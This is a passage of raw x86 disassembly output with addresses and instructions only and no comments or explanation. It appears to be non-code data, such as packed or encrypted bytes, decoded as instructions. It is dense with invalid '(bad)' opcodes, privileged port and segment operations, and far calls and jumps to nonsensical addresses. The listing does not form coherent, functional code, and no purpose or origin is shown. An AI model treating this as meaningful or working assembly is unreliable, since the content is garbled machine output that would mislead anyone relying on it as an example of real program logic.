  416142:	xchg   esp,eax
  416143:	popf   
  416144:	mov    dl,0xad
  416146:	mov    esi,0xea2ef89b
  41614b:	out    dx,al
  41614c:	or     al,BYTE PTR [edx+0x5e]
  41614f:	and    eax,0x814c0545
  416154:	xor    bl,cl
  416156:	jge    0x416175
  416158:	imul   ebp,DWORD PTR [ebp+0x4d],0xf
  41615c:	lock or BYTE PTR [edx+0x4b],dh
  416160:	das    
  416161:	jmp    0x26fcc0f
  416166:	mov    ds,WORD PTR [esp+ebp*2-0x4b]
  41616a:	(bad)  
  41616b:	xchg   esi,eax
  41616c:	sbb    BYTE PTR ds:0xdfc4a67a,ah
  416172:	sbb    eax,0xe5be0b4a
  416177:	mov    edx,0xc49b3fff
  41617c:	in     eax,dx
  41617d:	imul   esp,DWORD PTR [edi],0x7f
  416180:	and    bh,cl
  416182:	pop    ds
  416183:	mov    dl,0x11
  416185:	push   ecx
  416186:	pop    ebp
  416187:	bound  edx,QWORD PTR [edx+esi*8+0x32]
  41618b:	fisub  WORD PTR [ecx+0x42]
  41618e:	push   ss
  41618f:	lods   eax,DWORD PTR ds:[esi]
  416190:	push   ecx
  416191:	jno    0x416113
  416193:	stos   DWORD PTR es:[edi],eax
  416194:	sbb    eax,0xc550852b
  416199:	shl    edi,0x2d
  41619c:	pop    ds
  41619d:	bsr    ebp,DWORD PTR [eax-0x694d01ed]
  4161a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a5:	je     0x4161cb
  4161a7:	cwde   
  4161a8:	in     eax,dx
  4161a9:	push   esp
  4161aa:	or     ebp,ecx
  4161ac:	and    eax,ecx
  4161ae:	in     al,dx
  4161af:	inc    edi
  4161b0:	sti    
  4161b1:	in     al,dx
  4161b2:	push   0x47dc844f
  4161b7:	(bad)  
  4161b9:	mov    al,ds:0x688350c8
  4161be:	loope  0x416227
  4161c0:	data16 aad 0x28
  4161c3:	retf   0x60a7
  4161c6:	cld    
  4161c7:	sbb    eax,0xf6c7cd9e
  4161cc:	dec    esp
  4161cd:	or     eax,DWORD PTR [ebp-0x24662abc]
  4161d3:	jae    0x4161ff
  4161d5:	inc    esp
  4161d6:	add    eax,0xab5dbf2b
  4161db:	lea    ebx,[edi]
  4161dd:	or     BYTE PTR [eax-0x41432b69],dh
  4161e3:	rcr    DWORD PTR [edx],0x1f
  4161e6:	int3   
  4161e7:	scas   eax,DWORD PTR es:[edi]
  4161e8:	sub    eax,0xc7d042c0
  4161ed:	sub    al,dh
  4161ef:	mov    cl,0x90
  4161f1:	fistp  QWORD PTR [edx+eiz*2-0x15]
  4161f5:	pusha  
  4161f6:	jmp    0x416210
  4161f8:	xchg   ebx,eax
  4161f9:	outs   dx,DWORD PTR ds:[esi]
  4161fa:	(bad)  
  4161fb:	outs   dx,DWORD PTR ds:[esi]
  4161fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161fd:	sbb    cl,BYTE PTR [edx]
  4161ff:	imul   edx,DWORD PTR [ebp+0x3d],0xc52f2aeb
  416206:	std    
  416207:	icebp  
  416208:	cmp    esi,DWORD PTR [esi-0x4f]
  41620b:	cmp    ebx,DWORD PTR [esi]
  41620d:	inc    esp
  41620e:	and    bh,dl
  416210:	loop   0x41620d
  416212:	cmp    DWORD PTR [ebx+0x41],ebp
  416215:	lea    edx,[ebx-0xb]
  416218:	fs jecxz 0x41626f
  41621b:	dec    edi
  41621c:	mov    bl,0x9b
  41621e:	dec    ebp
  41621f:	xor    cl,ah
  416221:	rol    BYTE PTR [esp+ebp*1-0x71],cl
  416225:	aas    
  416226:	mov    ebp,0x2e5fa69d
  41622b:	inc    ebp
  41622c:	mov    ds:0x98379021,al
  416231:	in     eax,dx
  416232:	mov    ebx,0x6bbf
	...
  416293:	add    BYTE PTR [eax],al
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x5f5cf6de],bh
  4162a4:	jo     0x416285
  4162a6:	xchg   ebp,eax
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [esi+edi*1],dl
  4162b0:	(bad)  
  4162b1:	mov    bl,0xc6
  4162b3:	inc    ebp
  4162b4:	and    ecx,DWORD PTR [edi+0x528440b4]
  4162ba:	pop    eax
  4162bb:	pop    ebx
  4162bc:	repnz adc ecx,edx
  4162bf:	lds    esp,FWORD PTR [ebx]
  4162c1:	ins    DWORD PTR es:[edi],dx
  4162c2:	(bad)  
  4162c3:	mov    ds:0x42e7c633,al
  4162c8:	push   eax
  4162c9:	or     eax,0x6bf74404
  4162ce:	imul   ebp,DWORD PTR gs:[edi],0xfffffff1
  4162d2:	pusha  
  4162d3:	bound  ebp,QWORD PTR [ecx+esi*1]
  4162d6:	dec    edx
  4162d7:	in     al,0xc6
  4162d9:	in     al,dx
  4162da:	mov    al,0x97
  4162dc:	push   ss
  4162dd:	pusha  
  4162de:	sbb    DWORD PTR [esi+0x6d121bc],esi
  4162e4:	retf   
  4162e5:	cwde   
  4162e6:	push   ebp
  4162e7:	js     0x4162e7
  4162e9:	repnz and eax,0x56202539
  4162ef:	lock sahf 
  4162f1:	and    al,0xa
  4162f3:	shl    BYTE PTR [edx],1
  4162f5:	xchg   edi,eax
  4162f6:	cwde   
  4162f7:	jbe    0x416328
  4162f9:	sbb    ebx,0xffffffb1
  4162fc:	int    0x6d
  4162fe:	mov    ch,0x87
  416300:	push   ecx
  416301:	repz mov bh,dl
  416304:	push   ebx
  416305:	lods   eax,DWORD PTR ds:[esi]
  416306:	dec    edi
  416307:	inc    edi
  416308:	jmp    0x4162fe
  41630a:	inc    esi
  41630b:	ss sub dh,dl
  41630e:	mov    ah,0x1
  416310:	cmp    ebx,edi
  416312:	jae    0x41638f
  416314:	mov    bh,0x73
  416316:	jl     0x41629b
  416318:	test   al,dl
  41631a:	(bad)  
  41631b:	(bad)  
  41631c:	jmp    0x4162c5
  41631e:	int3   
  41631f:	cmp    dh,BYTE PTR [edx+ebx*4]
  416322:	or     edx,ebx
  416324:	ret    
  416325:	push   0xffffffa2
  416327:	call   0x79b8:0x175f24b
  41632e:	push   edx
  41632f:	in     eax,0x16
  416331:	xor    dl,BYTE PTR [edx+ebp*8+0x11]
  416335:	bound  edi,QWORD PTR [ebp-0x2c]
  416338:	aad    0xeb
  41633a:	sbb    esp,ecx
  41633c:	mov    gs,WORD PTR [ebp+0x50]
  41633f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416340:	ins    DWORD PTR es:[edi],dx
  416341:	add    al,0x5b
  416343:	mov    DWORD PTR [ebx+0x7502121],edx
  416349:	test   BYTE PTR [edi-0x4fa9b3d2],0x1c
  416350:	or     BYTE PTR [ebx],cl
  416352:	sbb    BYTE PTR [ebp-0x7ee55593],ah
  416358:	scas   al,BYTE PTR es:[edi]
  416359:	dec    DWORD PTR [eax]
  41635b:	stc    
  41635c:	jb     0x416359
  41635e:	adc    ebp,DWORD PTR [edi]
  416360:	hlt    
  416361:	imul   sp,WORD PTR [edi+ebp*2-0x4f],0xffa9
  416367:	cmp    DWORD PTR [ebp+ebx*8+0x5f98e707],edx
  41636e:	cmp    ebx,DWORD PTR [ebx]
  416370:	jbe    0x41631a
  416372:	cdq    
  416373:	pop    ds
  416374:	pop    esi
  416375:	jae    0x4163e1
  416377:	data16 and bh,BYTE PTR [ebx]
  41637a:	cwde   
  41637b:	mov    ebp,0x7fb8bf3a
  416380:	xor    eax,0xa8b93e4
  416385:	and    al,dh
  416387:	inc    ebx
  416388:	add    al,BYTE PTR [ebx-0x10ad8774]
  41638e:	ja     0x416327
  416390:	mov    eax,0x50447773
  416395:	div    DWORD PTR [edx-0xc]
  416398:	jecxz  0x41637f
  41639a:	(bad)  
  41639b:	cmp    bh,BYTE PTR [ecx]
  41639d:	rol    DWORD PTR [esi-0x58],1
  4163a0:	jge    0x41638c
  4163a2:	and    bh,dl
  4163a4:	stc    
  4163a5:	loope  0x416391
  4163a7:	jne    0x4163c8
  4163a9:	mov    BYTE PTR [ebx+0x48],bh
  4163ac:	dec    ebp
  4163ad:	mov    ds:0x587a24f6,al
  4163b2:	sbb    ebx,DWORD PTR [ebx]
  4163b4:	jnp    0x4163b6
	...
  416416:	repz inc ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0x502a97e2],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	cmp    edx,0x25fee53
  416434:	ror    DWORD PTR [eax],cl
  416436:	aam    0x33
  416438:	xor    eax,0x60b039ce
  41643d:	inc    ebp
  41643e:	cld    
  41643f:	sub    DWORD PTR [ecx+0x757188b3],0x69
  416446:	call   0x4750:0xb83bb6e6
  41644d:	ss pop ecx
  41644f:	dec    ebx
  416450:	mov    ss,WORD PTR [ebp-0x2a068368]
  416456:	jnp    0x41643b
  416458:	inc    ebx
  416459:	das    
  41645a:	inc    esp
  41645b:	das    
  41645c:	cmp    dl,BYTE PTR [ebx]
  41645e:	xchg   ebx,eax
  41645f:	cld    
  416460:	arpl   WORD PTR [edi-0x77b2746c],ax
  416466:	outs   dx,BYTE PTR ds:[esi]
  416467:	ret    0x4359
  41646a:	xchg   ebx,eax
  41646b:	cmc    
  41646c:	mov    BYTE PTR [ebp+0x3d],bh
  41646f:	push   es
  416470:	xor    dh,bh
  416472:	sub    DWORD PTR [ebx],0x3
  416475:	xchg   ebx,eax
  416476:	mov    esi,0xbe7bf60d
  41647b:	push   eax
  41647c:	adc    bh,ch
  41647e:	dec    edi
  41647f:	cmp    eax,0x6644324c
  416484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416485:	or     BYTE PTR gs:[eax],ah
  416488:	inc    esp
  416489:	scas   eax,DWORD PTR es:[edi]
  41648a:	mov    al,ds:0x8de25aea
  41648f:	test   DWORD PTR [edx+0x444d4d5],0x2538808
  416499:	lds    edx,FWORD PTR [edx-0x6c]
  41649c:	push   ss
  41649d:	pop    edx
  41649e:	add    ebx,DWORD PTR [eax]
  4164a0:	mul    ebp
  4164a2:	or     DWORD PTR [ebx-0x5981dc85],ebp
  4164a8:	add    ebp,DWORD PTR [ebp+0x2bab7d37]
  4164ae:	and    eax,0x469fdfb7
  4164b3:	nop
  4164b4:	inc    ebx
  4164b5:	test   DWORD PTR [ecx+0x40324d4d],edi
  4164bb:	push   es
  4164bc:	cdq    
  4164bd:	scas   eax,DWORD PTR es:[edi]
  4164be:	shl    BYTE PTR [edi+eiz*8+0x5b9e1226],cl
  4164c5:	dec    ebx
  4164c6:	loope  0x41647d
  4164c8:	push   es
  4164c9:	jne    0x416540
  4164cb:	mov    ds,WORD PTR [ebp-0x51]
  4164ce:	scas   al,BYTE PTR es:[edi]
  4164cf:	cdq    
  4164d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164d1:	stos   BYTE PTR es:[edi],al
  4164d2:	push   ss
  4164d3:	xchg   ebx,eax
  4164d4:	add    eax,0xa06af7bf
  4164d9:	inc    esp
  4164da:	cdq    
  4164db:	or     ah,ah
  4164dd:	add    eax,eax
  4164df:	js     0x41652b
  4164e1:	stos   DWORD PTR es:[edi],eax
  4164e2:	mov    bl,BYTE PTR [ebx-0x62cdaf7a]
  4164e8:	pop    ebp
  4164e9:	imul   esi,DWORD PTR [edx],0xffffffbc
  4164ec:	pop    ds
  4164ed:	pusha  
  4164ee:	das    
  4164ef:	(bad)  
  4164f0:	out    dx,eax
  4164f1:	push   ds
  4164f2:	lea    esi,[esi+0x144ae773]
  4164f8:	mov    esi,DWORD PTR [esi]
  4164fa:	test   DWORD PTR [ecx],esi
  4164fc:	xchg   esp,eax
  4164fd:	add    BYTE PTR [edx-0x27fe1d78],ch
  416503:	pop    edi
  416504:	and    DWORD PTR [esi],0xd6c15032
  41650a:	push   eax
  41650b:	mov    fs:0xaa8b2e9d,al
  416511:	dec    eax
  416512:	sbb    ah,BYTE PTR [ebx+0x75]
  416515:	into   
  416516:	cmp    DWORD PTR [ebp+0x96f5244],ebx
  41651c:	out    0xcb,eax
  41651e:	in     eax,0x1f
  416520:	xchg   DWORD PTR [ebp+0x68],edi
  416523:	ret    
  416524:	dec    eax
  416525:	sar    BYTE PTR [edi-0x7bea7d1d],1
  41652b:	mov    bh,0xe
  41652d:	push   ds
  41652e:	cmp    eax,0x3d3fc3f3
  416533:	sub    cl,BYTE PTR [esi]
	...
  416595:	add    BYTE PTR ds:0xfff32bd8,ah
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x4165dd
  4165a3:	or     eax,0xe9a3df92
  4165a8:	add    BYTE PTR [eax],al
  4165aa:	pop    es
  4165ab:	add    DWORD PTR [eax],eax
  4165ad:	add    BYTE PTR [eax-0x7d96f317],ch
  4165b3:	mov    edx,DWORD PTR [edx+0x4d9146b9]
  4165b9:	mov    edi,0x85169331
  4165be:	mov    al,ds:0x753a39e1
  4165c3:	nop
  4165c4:	leave  
  4165c5:	xchg   esp,eax
  4165c6:	inc    eax
  4165c7:	popf   
  4165c8:	jo     0x41655c
  4165ca:	(bad)  
  4165cc:	adc    DWORD PTR [edi+esi*8-0x86a79a0],edi
  4165d3:	jle    0x416557
  4165d5:	ds push edx
  4165d7:	or     DWORD PTR [eax+0x4c],0xc1c7add6
  4165de:	mov    ebx,gs
  4165e0:	rol    BYTE PTR [ecx+0x60336116],0x39
  4165e7:	add    DWORD PTR [ebx+0x4ef9a33c],ebp
  4165ed:	xchg   esp,eax
  4165ee:	pusha  
  4165ef:	xchg   esp,eax
  4165f0:	mov    al,ds:0xaed0108
  4165f5:	xchg   esi,eax
  4165f6:	inc    edi
  4165f7:	xchg   ebp,eax
  4165f8:	mov    ch,0x90
  4165fa:	inc    esp
  4165fb:	inc    ebp
  4165fc:	adc    esi,edx
  4165fe:	mov    ds:0x865fff35,eax
  416603:	pusha  
  416604:	sbb    DWORD PTR [esi+0x67],ebp
  416607:	scas   al,BYTE PTR es:[edi]
  416608:	fsub   DWORD PTR [edx+edi*8+0x4142bacc]
  41660f:	je     0x4165a9
  416611:	add    al,0xb6
  416613:	int    0x83
  416615:	sar    DWORD PTR [edi-0xb],cl
  416618:	inc    edi
  416619:	pop    edx
  41661a:	imul   esi,ecx,0x3c
  41661d:	sub    al,0xa7
  41661f:	pop    ds
  416620:	ins    BYTE PTR es:[edi],dx
  416621:	push   ecx
  416622:	fdivr  DWORD PTR [eax-0x32]
  416625:	or     bh,BYTE PTR [edi]
  416627:	dec    edi
  416628:	neg    DWORD PTR [edx]
  41662a:	call   0x7836:0xc420b4e7
  416631:	ja     0x4165bb
  416633:	cmp    ebx,DWORD PTR [esi-0x20]
  416636:	push   edx
  416637:	js     0x41663d
  416639:	cwde   
  41663a:	std    
  41663b:	retf   
  41663c:	jmp    0x4165f3
  41663e:	out    dx,al
  41663f:	jmp    0x79a53388
  416644:	ror    DWORD PTR [ebp-0x46],0x40
  416648:	sbb    al,0x62
  41664a:	sahf   
  41664b:	add    dh,BYTE PTR [ecx-0x42]
  41664e:	popf   
  41664f:	lods   al,BYTE PTR ds:[esi]
  416650:	out    0x37,eax
  416652:	rcr    cl,cl
  416654:	icebp  
  416655:	sbb    eax,0x4a5d5f4e
  41665a:	add    edi,edi
  41665c:	(bad)  
  41665e:	sub    ecx,DWORD PTR [esi]
  416660:	cdq    
  416661:	mov    WORD PTR [edx+0x14],es
  416664:	outs   dx,BYTE PTR ds:[esi]
  416665:	sbb    BYTE PTR [edx-0x82e23fc],ah
  41666b:	(bad)  
  41666c:	fld    QWORD PTR [esi-0x64]
  41666f:	loopne 0x41665e
  416671:	or     eax,0xa4598b97
  416676:	cmp    ebp,ebx
  416678:	and    BYTE PTR [edx-0x6a],dl
  41667b:	push   0xffffff93
  41667d:	loopne 0x41667a
  41667f:	outs   dx,BYTE PTR ds:[esi]
  416680:	add    dl,BYTE PTR [edi+0x3f]
  416683:	sbb    BYTE PTR [esi+0x6d9866dd],dl
  416689:	scas   al,BYTE PTR es:[edi]
  41668a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41668b:	mov    ebp,0xa59dafa1
  416690:	aad    0x88
  416692:	and    al,0xf4
  416694:	dec    ebp
  416695:	loopne 0x4166f8
  416697:	pop    esp
  416698:	(bad)  
  416699:	mov    ebx,0x4a9dde20
  41669e:	dec    eax
  41669f:	mov    eax,DWORD PTR [eax-0x4c]
  4166a2:	js     0x416709
  4166a4:	and    al,0x18
  4166a6:	xor    DWORD PTR [ebx+0x1f00ff30],eax
  4166ac:	pusha  
  4166ad:	aad    0x54
  4166af:	mov    bh,0xea
  4166b1:	sar    BYTE PTR [edi+0x9f2a],0x0
	...
  416714:	add    BYTE PTR [eax],al
  416716:	(bad)  
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	pusha  
  416723:	stos   BYTE PTR es:[edi],al
  416724:	repnz shr DWORD PTR [edx+0x70000ea],cl
  41672b:	add    DWORD PTR [eax],eax
  41672d:	add    BYTE PTR [edi+0x49f8c6c2],cl
  416733:	sub    BYTE PTR [edx],bh
  416735:	xchg   edi,esp
  416737:	out    0xd9,eax
  416739:	mov    eax,ds:0xce227da7
  41673e:	jno    0x4167b7
  416740:	or     BYTE PTR [ecx-0x60],dh
  416743:	aas    
  416744:	inc    ebp
  416745:	in     eax,dx
  416746:	xchg   ebx,eax
  416747:	popa   
  416748:	push   cs
  416749:	push   esp
  41674a:	mov    ch,0xc5
  41674c:	(bad)  
  41674d:	fcomi  st,st(3)
  41674f:	fdiv   QWORD PTR [esi]
  416751:	push   ds
  416752:	inc    edi
  416753:	adc    al,0x2f
  416755:	cmp    al,0xd8
  416757:	mov    ebx,0xa9a17485
  41675c:	inc    ecx
  41675d:	add    DWORD PTR [eax-0x5d],0xf69db937
  416764:	inc    esp
  416765:	xchg   BYTE PTR [ebp-0x38f105e3],dh
  41676b:	cmp    cl,0x7e
  41676e:	jae    0x4167e3
  416770:	mul    BYTE PTR [ecx]
  416772:	or     al,0x14
  416774:	inc    esp
  416775:	push   0x1
  416777:	shl    ah,0x61
  41677a:	pop    ebp
  41677b:	xor    eax,0x9bc72b0d
  416780:	lahf   
  416781:	or     eax,DWORD PTR [ecx-0x5]
  416784:	in     eax,dx
  416785:	xlat   BYTE PTR ds:[ebx]
  416786:	push   ds
  416787:	pop    ss
  416788:	shl    BYTE PTR [ebx-0x17deaab2],0xe9
  41678f:	icebp  
  416790:	popf   
  416791:	pusha  
  416792:	and    al,0x13
  416794:	and    al,0x94
  416796:	or     DWORD PTR [ebx+0x21],0xb8d53a4d
  41679d:	hlt    
  41679e:	push   0xa1af77ac
  4167a3:	jmp    FWORD PTR [edx+0x3b]
  4167a6:	mov    eax,0xec004794
  4167ab:	ror    dl,cl
  4167ad:	pop    es
  4167ae:	xor    edi,DWORD PTR [eax+0x35f7e5e7]
  4167b4:	mov    esi,0x48c7fb1c
  4167b9:	mov    ds,WORD PTR [edx-0x7de0a91e]
  4167bf:	or     al,BYTE PTR [ebp-0x6b]
  4167c2:	xchg   esp,eax
  4167c3:	pop    esi
  4167c4:	add    eax,0xecb9a239
  4167c9:	cmp    eax,0x747bc1f
  4167ce:	cmp    esi,esi
  4167d0:	test   DWORD PTR [ebp-0x2a034d13],edx
  4167d6:	mov    eax,0xa905697f
  4167db:	stos   BYTE PTR es:[edi],al
  4167dc:	scas   eax,DWORD PTR es:[edi]
  4167dd:	ins    BYTE PTR es:[edi],dx
  4167de:	out    0xfb,eax
  4167e0:	sti    
  4167e1:	push   0x3cc6bd2d
  4167e6:	jecxz  0x4167b0
  4167e8:	inc    esp
  4167e9:	inc    esi
  4167ea:	inc    esi
  4167eb:	pop    eax
  4167ec:	lods   al,BYTE PTR ds:[esi]
  4167ed:	rcr    BYTE PTR [edx-0x2da2c52c],0xe2
  4167f4:	stc    
  4167f5:	cmc    
  4167f6:	call   0xd530:0xc7a253fb
  4167fd:	rcl    BYTE PTR [esp+edx*8-0x3682c9d8],1
  416804:	fbld   TBYTE PTR [edi]
  416806:	push   es
  416807:	enter  0x73a7,0xd1
  41680b:	inc    esp
  41680c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41680d:	pop    edx
  41680e:	or     al,0xd8
  416810:	adc    BYTE PTR [edx+0x2b6f5719],ch
  416816:	test   al,0x15
  416818:	daa    
  416819:	add    eax,0x12fd1c5e
  41681e:	inc    edi
  41681f:	xchg   edx,eax
  416820:	sbb    al,0xf4
  416822:	pop    eax
  416823:	pop    eax
  416824:	cmp    eax,0x39c0610a
  416829:	or     al,BYTE PTR ss:[eax-0x2869e90a]
  416830:	aam    0x5c
  416832:	add    al,0x3
  416834:	dec    ebx
	...
  416895:	add    cl,dl
  416897:	scas   eax,DWORD PTR es:[edi]
  416898:	push   es
  416899:	repz jle 0x416897
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz test DWORD PTR [edi],0xebb12729
  4168a8:	add    BYTE PTR [eax],al
  4168aa:	pop    es
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [esi],al
  4168af:	sub    ch,cl
  4168b1:	xor    esi,0xffffff9d
  4168b4:	bound  ecx,QWORD PTR [esi]
  4168b6:	mov    ecx,0x690137dd
  4168bb:	mov    bl,0x2c
  4168bd:	imul   ebp,DWORD PTR [edx],0xffffffb0
  4168c0:	stos   DWORD PTR es:[edi],eax
  4168c1:	stos   BYTE PTR es:[edi],al
  4168c2:	inc    eax
  4168c3:	shl    DWORD PTR [eax],1
  4168c5:	aam    0xa4
  4168c7:	out    dx,al
  4168c8:	(bad)  
  4168c9:	cdq    
  4168ca:	sub    eax,0x238a146d
  4168cf:	adc    al,0x4a
  4168d1:	xchg   ebx,eax
  4168d2:	aam    0x5f
  4168d4:	sub    bh,al
  4168d6:	mov    esp,0xf819909e
  4168db:	call   0x40af:0x59adf0e7
  4168e2:	in     eax,0xe1
  4168e4:	xchg   ebx,eax
  4168e5:	cwde   
  4168e6:	test   al,0x3e
  4168e8:	push   eax
  4168e9:	shr    ebx,0x88
  4168ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168ed:	sub    esp,esi
  4168ef:	ss (bad) 
  4168f1:	xchg   ebp,eax
  4168f2:	dec    ecx
  4168f3:	xor    ebp,DWORD PTR [ecx]
  4168f5:	jae    0x41687e
  4168f7:	adc    DWORD PTR [edx],ebx
  4168f9:	cld    
  4168fa:	adc    eax,0x6896268e
  4168ff:	jl     0x416885
  416901:	stc    
  416902:	and    DWORD PTR [edx+ecx*1+0x3c],0x27fcfdaf
  41690a:	jmp    0x416970
  41690c:	dec    edi
  41690d:	stc    
  41690e:	mov    ah,0x2d
  416910:	pop    eax
  416911:	popf   
  416912:	loopne 0x4168b7
  416914:	xchg   esi,eax
  416915:	sub    al,0x77
  416917:	test   DWORD PTR [edx-0xc7b1144],ecx
  41691d:	jmp    0x973dabc3
  416922:	inc    esi
  416923:	xchg   ecx,eax
  416924:	outs   dx,DWORD PTR ds:[esi]
  416925:	int3   
  416926:	cmc    
  416927:	(bad)  
  416929:	aad    0xf6
  41692b:	push   ebx
  41692c:	xor    BYTE PTR [ecx+edx*1],al
  41692f:	sbb    BYTE PTR [ecx+0x32908168],0x22
  416936:	test   BYTE PTR ds:[edx+0xef23f92],bh
  41693d:	(bad)  
  41693e:	aam    0xee
  416940:	aad    0xf1
  416942:	pusha  
  416943:	jmp    0xc7c:0x59dc1d79
  41694a:	mov    ah,0x4
  41694c:	xor    eax,0x9a74bf78
  416951:	loop   0x4168eb
  416953:	pop    ecx
  416954:	cmp    BYTE PTR [edi],bh
  416956:	or     esp,DWORD PTR [ecx+ebx*2-0x189a3c69]
  41695d:	mov    edx,0x3d7e20bd
  416962:	std    
  416963:	adc    edx,esi
  416965:	or     eax,0x89ff047c
  41696a:	rcl    BYTE PTR [ebp-0x43],0xd1
  41696e:	fnstsw WORD PTR [ecx]
  416970:	addr16 pop edx
  416972:	cli    
  416973:	xor    esi,DWORD PTR [ebx]
  416975:	sbb    cl,dl
  416977:	sahf   
  416978:	sub    ah,dl
  41697a:	push   0xdd8f6a6
  41697f:	jl     0x41693e
  416981:	sahf   
  416982:	int3   
  416983:	xlat   BYTE PTR ds:[ebx]
  416984:	outs   dx,BYTE PTR ds:[esi]
  416985:	mov    ds:0xd5db33af,eax
  41698a:	xor    al,0x91
  41698c:	push   ebx
  41698d:	fsqrt  
  41698f:	sbb    eax,0xe2bf520
  416994:	ds dec ecx
  416996:	aad    0x1b
  416998:	xchg   ebp,eax
  416999:	std    
  41699a:	cmp    al,BYTE PTR [ebx-0x1fabe1e1]
  4169a0:	xchg   ebp,eax
  4169a1:	inc    eax
  4169a2:	add    eax,0xb60436bf
  4169a7:	dec    ecx
  4169a8:	mov    esp,0xa3db06d0
  4169ad:	(bad)  [eax]
  4169af:	test   eax,0xad6c5789
  4169b4:	mov    eax,ds:0x0
	...
  416a15:	add    bl,cl
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	inc    ebp
  416a23:	cmovp  esi,DWORD PTR ds:0xecb8
  416a2a:	pop    es
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [edx+0x7],cl
  416a30:	loopne 0x416a36
  416a32:	in     al,dx
  416a33:	xlat   BYTE PTR ds:[ebx]
  416a34:	mov    eax,0x844a230
  416a39:	out    0x2,al
  416a3b:	scas   eax,DWORD PTR es:[edi]
  416a3c:	mov    ebx,0xbad2183a
  416a41:	pop    ecx
  416a42:	adc    eax,0xf76d34b4
  416a47:	stos   BYTE PTR es:[edi],al
  416a48:	inc    ecx
  416a49:	scas   eax,DWORD PTR es:[edi]
  416a4a:	jae    0x416a22
  416a4c:	sbb    eax,0x7de07765
  416a51:	aas    
  416a52:	test   DWORD PTR [edx+0x54],eax
  416a55:	stc    
  416a56:	test   BYTE PTR [eax-0x6285121e],bh
  416a5c:	add    DWORD PTR [edi-0xd],ecx
  416a5f:	pusha  
  416a60:	adc    ch,BYTE PTR [eax+ecx*8]
  416a63:	in     eax,0x60
  416a65:	sbb    edx,0xffffffef
  416a68:	in     eax,dx
  416a69:	out    0x5d,al
  416a6b:	rol    DWORD PTR [eax-0x76],cl
  416a6e:	fnstcw WORD PTR [eax+0x34bfde4c]
  416a74:	sbb    eax,0xe3a29fa9
  416a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7a:	mov    bl,0x99
  416a7c:	sub    ebx,DWORD PTR [esp+esi*4+0x748cd870]
  416a83:	int3   
  416a84:	adc    eax,0x331ede23
  416a89:	cmp    BYTE PTR [edx+edx*2],al
  416a8c:	pop    ecx
  416a8d:	pop    DWORD PTR [ebp-0xe9cbfcf]
  416a93:	add    cl,ah
  416a95:	icebp  
  416a96:	mov    dl,0xaa
  416a98:	(bad)  
  416a99:	jmp    0x416a7f
  416a9b:	popa   
  416a9c:	or     al,0x2a
  416a9e:	mov    ds:0x57d06d58,al
  416aa3:	pop    esi
  416aa4:	mov    ebp,0xfdfa3fc4
  416aa9:	jno    0x416adb
  416aab:	clc    
  416aac:	xchg   ecx,eax
  416aad:	pop    ss
  416aae:	or     al,0x1c
  416ab0:	loopne 0x416b16
  416ab2:	aam    0x3
  416ab4:	dec    eax
  416ab5:	xor    BYTE PTR [edx-0x635efa0d],0x6
  416abc:	jmp    0x3d6d1dc0
  416ac1:	xor    al,0x3a
  416ac3:	std    
  416ac4:	or     BYTE PTR [esi+0x6a],0x6e
  416ac8:	outs   dx,BYTE PTR ds:[esi]
  416ac9:	xchg   esi,eax
  416aca:	mov    ds:0x448ab0a5,eax
  416acf:	sbb    bl,BYTE PTR [eax+0x36]
  416ad2:	push   ecx
  416ad3:	jge    0x416b45
  416ad5:	leave  
  416ad6:	dec    eax
  416ad7:	mov    ecx,ss
  416ad9:	adc    al,0x4e
  416adb:	and    cl,BYTE PTR [ebp+0x10]
  416ade:	mov    DWORD PTR [eax-0x520d1e46],ecx
  416ae4:	outs   dx,DWORD PTR ds:[esi]
  416ae5:	mov    WORD PTR ds:0xfd938fd3,fs
  416aeb:	jl     0x416b4c
  416aed:	mul    BYTE PTR [edx]
  416aef:	xchg   esp,eax
  416af0:	mov    ecx,0xd2f336ce
  416af5:	outs   dx,DWORD PTR ds:[esi]
  416af6:	xor    BYTE PTR [esi+eax*4],al
  416af9:	jecxz  0x416ae5
  416afb:	mov    ebx,0x251cff00
  416b00:	fstp   QWORD PTR [edi+ebp*4]
  416b03:	(bad)  
  416b04:	imul   BYTE PTR [ebx-0x37]
  416b07:	xchg   DWORD PTR [ebx-0x11],edx
  416b0a:	inc    esi
  416b0b:	inc    esi
  416b0c:	or     eax,0xebe58436
  416b11:	iret   
  416b12:	imul   esi
  416b14:	lods   eax,DWORD PTR ds:[esi]
  416b15:	sub    bh,BYTE PTR [eax-0x8]
  416b18:	jl     0x416aed
  416b1a:	add    eax,0xdbe38f31
  416b1f:	ins    DWORD PTR es:[edi],dx
  416b20:	call   0x954a29c0
  416b25:	gs xchg esi,eax
  416b27:	scas   eax,DWORD PTR es:[edi]
  416b28:	popf   
  416b29:	push   esi
  416b2a:	imul   ebx,DWORD PTR [edi-0x4f],0x3051fb6a
